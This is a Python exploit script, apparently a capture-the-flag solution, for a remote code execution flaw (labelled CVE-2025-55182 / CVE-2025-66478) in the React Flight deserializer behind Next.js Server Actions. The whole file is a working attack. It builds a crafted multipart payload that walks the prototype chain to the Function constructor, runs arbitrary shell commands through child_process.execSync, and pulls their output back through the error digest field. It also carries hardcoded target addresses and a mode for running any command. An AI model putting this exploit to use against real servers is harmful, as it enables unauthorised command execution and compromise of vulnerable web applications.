#!/usr/bin/env python3
# /// script
# dependencies = ["requests"]
# ///
"""
Dow is Up 50k -- React2Shell RCE (CVE-2025-55182 / CVE-2025-66478)

StockWatch runs Next.js 15.1.0 + React 19.0.0. The React Flight deserializer
used by Server Actions resolves reference chains (e.g. "$1:foo:bar") without
checking that each key is an *own* property of the object. That lets us walk an
object -> __proto__ -> constructor -> constructor to reach the `Function`
constructor, then invoke it with attacker-controlled source. All of this runs
*during deserialization*, before the action id is validated -- so any value in
the `Next-Action` header triggers it.

The injected JS runs a shell command and smuggles the output back inside the
error `digest` field of the response.

Credit: reference-chain-to-Function technique by maple3142; PoC shape adapted
from msanft/CVE-2025-55182.

Usage:
  ./solve.py                         # default target; confirm RCE + read flag
  ./solve.py http://host:3000/       # custom target
  ./solve.py http://host:3000/ 'id'  # run an arbitrary command
"""
import json
import re
import sys

import requests

# Mirror 1 default. Mirror 2: http://18.145.136.91:3000/
BASE = sys.argv[1] if len(sys.argv) > 1 else "http://18.215.143.250:3000/"


def rce(cmd: str) -> str:
    """Run `cmd` on the target and return its stdout (via the error digest)."""
    # `; true` forces exit code 0. execSync() throws on a non-zero exit and the
    # thrown error replaces our output with a generic numeric digest, so without
    # this a command like `cat missing-file` would silently return nothing.
    inner = cmd + "; true"
    prefix = (
        "var r=process.mainModule.require('child_process')"
        ".execSync('" + inner + "',{'timeout':5000}).toString().trim();"
        "throw Object.assign(new Error('NEXT_REDIRECT'),{digest:`${r}`});"
    )
    crafted = {
        # Overwrite our own .then with Chunk.prototype.then (reached via the raw
        # chunk returned by "$@0"), so awaiting us re-enters the Flight parser.
        "then": "$1:__proto__:then",
        "status": "resolved_model",
        "reason": -1,
        # Second pass: "$B0" is the blob gadget -> _formData.get(_prefix + "0").
        "value": '{"then": "$B0"}',
        "_response": {
            # _formData.get resolves to the Function constructor; _prefix is the
            # function body -> Function("<our JS>")("0") executes it.
            "_prefix": prefix,
            "_formData": {"get": "$1:constructor:constructor"},
        },
    }
    files = {
        "0": (None, json.dumps(crafted)),
        "1": (None, '"$@0"'),  # raw ref to chunk 0 -> Chunk, whose .then we steal
    }
    # The action id is never checked -- deserialization happens first.
    resp = requests.post(BASE, files=files, headers={"Next-Action": "x"}, timeout=15)
    m = re.search(r"^\d+:E(\{.*\})\s*$", resp.text, re.M | re.S)
    if not m:
        return "[no digest found] status=%s\n%s" % (resp.status_code, resp.text)
    try:
        return json.loads(m.group(1)).get("digest", "")
    except json.JSONDecodeError:
        return m.group(1)


def main() -> None:
    if len(sys.argv) > 2:
        print(rce(" ".join(sys.argv[2:])))
        return

    print("[*] target:", BASE)
    print("[*] 1. confirm RCE (id):")
    print("   ", rce("id"))
    print("[*] 2. locate the flag (ls -la /):")
    print("   ", rce("ls -la /"))
    print("[*] 3. read the flag:")
    print("   ", rce("cat /flag.txt"))


if __name__ == "__main__":
    main()
